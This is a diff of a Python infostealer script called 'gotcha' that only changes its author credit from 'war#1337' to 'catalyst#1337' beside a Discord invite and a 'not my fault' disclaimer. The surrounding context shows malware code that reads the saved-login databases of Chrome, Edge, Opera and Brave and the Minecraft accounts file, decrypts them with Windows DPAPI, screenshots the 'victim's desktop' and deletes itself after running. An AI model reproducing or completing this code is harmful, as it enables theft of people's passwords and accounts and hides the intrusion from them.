@@ -19,7 +19,7 @@ import time
 from os import remove
 from sys import argv
 
-#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha- program by catalyst#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 DBP = r'Google\Chrome\User Data\Default\Login Data'
 EBP = r'Microsoft\Edge\User Data\Default\Login Data'
@@ -27,7 +27,7 @@ MCBP = r'.minecraft\launcher_accounts.json'
 OBP = r'\Opera Software\Opera Stable'
 BBP = r'\BraveSoftware\Brave-Browser\User Data\Default\Login Data'
 ADP = os.environ['LOCALAPPDATA']
-#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha- program by catalyst#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 
 def gotchasniff(path):
@@ -84,7 +84,7 @@ def dpapi(encrypted):
     result = ctypes.string_at(blobout.pbData, blobout.cbData)
     ctypes.windll.kernel32.LocalFree(blobout.pbData)
     return result
-#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha- program by catalyst#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 
 def localdata():
@@ -150,7 +150,7 @@ class chrome:
         except WindowsError:
             return None
 
-#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha- program by catalyst#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 def localdata2():
     jsn = None
@@ -215,7 +215,7 @@ class edge:
         except WindowsError:
             return None
 
-#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha- program by catalyst#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 def localdata3():
     jsn = None
@@ -410,7 +410,7 @@ def gotcha():
 
         message += '```'
     
-#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha- program by catalyst#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
     """screenshot victim's desktop"""
     try:
@@ -535,6 +535,6 @@ def gotcha():
         remove(argv[0])
     except:
     	pass
-#gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+#gotcha- program by catalyst#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 gotcha()
